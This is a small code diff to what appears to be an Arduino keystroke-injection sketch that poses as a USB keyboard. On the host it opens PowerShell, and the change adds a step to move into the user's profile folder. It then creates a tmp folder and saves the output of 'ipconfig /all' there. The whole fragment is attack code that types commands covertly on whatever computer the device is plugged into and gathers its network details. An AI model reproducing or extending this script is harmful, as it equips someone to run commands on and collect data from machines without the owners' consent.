@@ -46,6 +46,8 @@ void loop() {
   Keyboard.println("powershell.exe");
   delay(5000);
 
+  Keyboard.println("cd $Env:userprofile");
+  delay(2000);
   Keyboard.println("mkdir tmp");
   delay(2000);
   Keyboard.println("ipconfig /all > ./tmp/ip_info.txt");
@@ -73,7 +75,6 @@ void loop() {
   delay(3000);
   Keyboard.println("exit");
   delay(500);
-
 
   //End Keyboard Control
   Keyboard.end();
